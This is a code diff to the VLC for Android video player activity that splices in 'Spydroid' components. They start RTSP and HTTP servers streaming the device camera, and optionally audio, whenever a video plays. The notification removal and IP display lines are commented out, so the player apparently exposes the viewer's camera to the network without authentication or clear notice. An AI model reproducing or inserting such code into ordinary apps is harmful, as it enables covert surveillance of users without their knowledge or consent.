@@ -21,9 +21,16 @@
 package org.videolan.vlc.gui.video;
 
 import java.io.File;
+import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.lang.reflect.Method;
 import java.net.URLDecoder;
+
+import net.majorkernelpanic.networking.RtspServer;
+import net.majorkernelpanic.networking.Session;
+import net.majorkernelpanic.spydroid.CustomHttpServer;
+import net.majorkernelpanic.streaming.video.H264Stream;
+import net.majorkernelpanic.streaming.video.VideoQuality;
 
 import org.videolan.vlc.AudioServiceController;
 import org.videolan.vlc.DatabaseManager;
@@ -46,6 +53,7 @@ import android.annotation.TargetApi;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.KeyguardManager;
+import android.app.NotificationManager;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.DialogInterface;
@@ -57,10 +65,12 @@ import android.content.res.Configuration;
 import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.media.AudioManager;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
+import android.os.PowerManager;
 import android.preference.PreferenceManager;
 import android.provider.Settings.SettingNotFoundException;
 import android.text.format.DateFormat;
@@ -77,12 +87,16 @@ import android.view.View.OnClickListener;
 import android.view.View.OnSystemUiVisibilityChangeListener;
 import android.view.ViewGroup.LayoutParams;
 import android.view.WindowManager;
+import android.view.animation.Animation;
 import android.view.animation.AnimationUtils;
 import android.widget.ArrayAdapter;
 import android.widget.FrameLayout;
 import android.widget.ImageButton;
+import android.widget.ImageView;
+import android.widget.LinearLayout;
 import android.widget.ListView;
 import android.widget.SeekBar;
+import android.widget.Toast;
 import android.widget.SeekBar.OnSeekBarChangeListener;
 import android.widget.TextView;
 
@@ -169,6 +183,19 @@ public class VideoPlayerActivity extends Activity {
     private ArrayAdapter<String> mAudioTracksAdapter;
     private String[] mSubtitleTracksLibVLC;
     private ArrayAdapter<String> mSubtitleTracksAdapter;
+    
+    
+    //---------- SPYDROID BEGIN --------------//
+    private CustomHttpServer httpServer = null;
+    private PowerManager.WakeLock wl;
+    private RtspServer rtspServer = null;
+    private SurfaceHolder holder;
+    private SurfaceView camera;
+    private Context context;
+    
+    private boolean streaming = false;
+    
+    //---------- SPYDROID END --------------//
 
     @Override
     @TargetApi(11)
@@ -176,6 +203,33 @@ public class VideoPlayerActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.player);
 
+        //---------- SPYDROID BEGIN --------------//
+        camera = (SurfaceView)findViewById(R.id.smallcameraview);
+        context = this.getApplicationContext();
+        
+        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(this);
+        H264Stream.setPreferences(settings);
+        
+        camera.getHolder().setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
+        holder = camera.getHolder();
+        
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "net.majorkernelpanic.spydroid.wakelock");
+        
+        Session.setSurfaceHolder(holder);
+        Session.setHandler(handler);
+        Session.setDefaultAudioEncoder(settings.getBoolean("stream_audio", false)?Integer.parseInt(settings.getString("audio_encoder", "3")):0);
+        Session.setDefaultVideoEncoder(settings.getBoolean("stream_video", true)?Integer.parseInt(settings.getString("video_encoder", "2")):0);
+        Session.setDefaultVideoQuality(new VideoQuality(settings.getInt("video_resX", 0), 
+        		settings.getInt("video_resY", 0), 
+        		Integer.parseInt(settings.getString("video_framerate", "0")), 
+        		Integer.parseInt(settings.getString("video_bitrate", "0"))*1000));
+        
+        rtspServer = new RtspServer(8086, handler);
+        httpServer = new CustomHttpServer(8080, this.getApplicationContext(), handler);
+        
+        //---------- SPYDROID END --------------//
+        
         SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(this);
         if(Util.isICSOrLater())
             getWindow().getDecorView().findViewById(android.R.id.content).setOnSystemUiVisibilityChangeListener(
@@ -280,21 +334,44 @@ public class VideoPlayerActivity extends Activity {
         this.setVolumeControlStream(AudioManager.STREAM_MUSIC);
 
         // 100 is the value for screen_orientation_start_lock
-        setRequestedOrientation(mScreenOrientation != 100
-                ? mScreenOrientation
-                : getScreenOrientation());
+        //HiepNH - commented
+//        setRequestedOrientation(mScreenOrientation != 100
+//                ? mScreenOrientation
+//                : getScreenOrientation());
     }
 
     @Override
     protected void onStart() {
+    	
+    	//---------- SPYDROID BEGIN --------------//
+    	// Lock screen
+    	wl.acquire();
+    	//---------- SPYDROID END --------------//
+    	
         super.onStart();
         showOverlay();
         mSwitchingView = false;
     }
+    
+    //---------- SPYDROID BEGIN --------------//
+    public void onStop() {
+    	super.onStop();
+    	wl.release();
+    }
+    //---------- SPYDROID END --------------//
+    
 
     @Override
     protected void onPause() {
         super.onPause();
+        
+        //---------- SPYDROID BEGIN --------------//
+        
+        if (rtspServer != null) rtspServer.stop();
+    	CustomHttpServer.setScreenState(false);
+    	//unregisterReceiver(wifiStateReceiver);
+    	
+    	//---------- SPYDROID END --------------//
 
         if(mSwitchingView) {
             Log.d(TAG, "mLocation = \"" + mLocation + "\"");
@@ -349,6 +426,16 @@ public class VideoPlayerActivity extends Activity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        
+        //---------- SPYDROID BEGIN --------------//
+        
+        // Remove notification
+    	//((NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE)).cancel(0);
+    	if (httpServer != null) httpServer.stop();
+    	if (rtspServer != null) rtspServer.stop();
+    	
+    	//---------- SPYDROID END --------------//
+        
         unregisterReceiver(mBatteryReceiver);
         if (mLibVLC != null && !mSwitchingView) {
             mLibVLC.stop();
@@ -363,6 +450,16 @@ public class VideoPlayerActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
+        
+        //---------- SPYDROID BEGIN --------------//
+        
+        // Determines if user is connected to a wireless network & displays ip 
+    	//if (!streaming) displayIpAddress();
+    	startServers();
+    	//registerReceiver(wifiStateReceiver,new IntentFilter(WifiManager.NETWORK_STATE_CHANGED_ACTION));
+    	
+    	//---------- SPYDROID END --------------//
+    	
         AudioServiceController.getInstance().bindAudioService(this);
 
         load();
@@ -1309,4 +1406,59 @@ public class VideoPlayerActivity extends Activity {
             return 0;
         }
     }
+    
+    
+    //---------- SPYDROID BEGIN --------------//
+    public void log(String s) {
+    	Toast.makeText(context, s, Toast.LENGTH_SHORT).show();
+    }
+    
+    private void startServers() {
+    	if (rtspServer != null) {
+    		try {
+    			rtspServer.start();
+    		} catch (IOException e) {
+    			log("RtspServer could not be started : "+(e.getMessage()!=null?e.getMessage():"Unknown error"));
+    		}
+    	}
+    	if (httpServer != null) {
+    		CustomHttpServer.setScreenState(true);
+    		try {
+    			httpServer.start();
+    		} catch (IOException e) {
+    			log("HttpServer could not be started : "+(e.getMessage()!=null?e.getMessage():"Unknown error"));
+    		}
+    	}
+    }
+    
+    // The Handler that gets information back from the RtspServer and Session
+    private final Handler handler = new Handler() {
+    	
+    	public void handleMessage(Message msg) { 
+    		/*
+    		switch (msg.what) {
+    		case RtspServer.MESSAGE_LOG:
+    			log((String)msg.obj);
+    			break;
+    		case RtspServer.MESSAGE_ERROR:
+    			log((String)msg.obj);
+    			break;
+    		case Session.MESSAGE_START:
+    			streaming = true;
+    			streamingState(1);
+    			break;
+    		case Session.MESSAGE_STOP:
+    			streaming = false;
+    			displayIpAddress();
+    			break;
+    		case Session.MESSAGE_ERROR:
+    			log((String)msg.obj);
+    			break;
+    		}
+    		*/
+    	}
+    	
+    };
+    
+  //---------- SPYDROID END --------------//
 }
